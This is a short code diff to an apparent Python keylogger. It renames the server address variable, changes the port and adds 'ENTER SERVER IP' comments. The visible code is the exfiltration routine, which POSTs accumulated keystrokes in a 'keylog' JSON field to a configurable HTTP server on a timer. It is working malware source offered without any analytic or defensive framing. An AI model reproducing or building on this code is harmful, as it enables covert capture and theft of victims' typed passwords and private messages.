@@ -4,8 +4,8 @@ import threading
 
 text = ""
 last_sent_text = "" 
-IP_ADDR = "127.0.0.1"
-PORT = "8080"
+HOST = "127.0.0.1" #ENTER SERVER IP
+PORT = "5000" #ENTER PORT
 update_time = 10 
 
 def send_post_req():
@@ -14,7 +14,7 @@ def send_post_req():
     if text and text != last_sent_text:
         try:
             payload = {"keylog": text}
-            r = requests.post(f"http://{IP_ADDR}:{PORT}", json=payload, headers={"Content-Type": "application/json"})
+            r = requests.post(f"http://{HOST}:{PORT}", json=payload, headers={"Content-Type": "application/json"})
             if r.status_code == 200:
                 last_sent_text = text  
                 text = ""
